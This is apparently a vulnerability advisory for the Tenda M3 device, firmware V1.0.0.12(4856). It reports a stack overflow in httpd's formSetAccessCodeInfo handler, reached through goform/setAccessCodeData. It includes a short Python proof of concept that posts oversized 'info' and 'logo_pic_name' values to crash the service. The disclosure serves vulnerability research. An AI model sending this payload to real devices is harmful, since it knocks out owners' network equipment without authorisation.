## Overview

- The device's official website: https://www.tenda.com.cn/product/M3.html
- Firmware download website: https://www.tenda.com.cn/download/detail-3133.html

## Affected version

V1.0.0.12(4856)

## Vulnerability details

httpd in directory `/bin` has a stack overflow vulnerability. The vulnerability occurrs in the `formSetAccessCodeInfo` function, which can be accessed via the URL `goform/setAccessCodeData`

<img src="img/image-20220527170409741.png" alt="image-20220527170409741" style="zoom:50%;" />

`formSetAccessCodeInfo` function gets the POST parameter `info` and `logo_pic_name`and copies to stack buffer without checking its length, causing a stack overflow vulnerability.

## PoC

Poc of Denial of Service(DoS)

```python
import requests

data = {
    b"info": b'A'*0x400,
    b"logo_pic_name": b'A'*0x400
}
cookies = {
    b"user": "admin"
}
res = requests.post("http://127.0.0.1/goform/setAccessCodeData", data=data, cookies=cookies)
print(res.content)
```

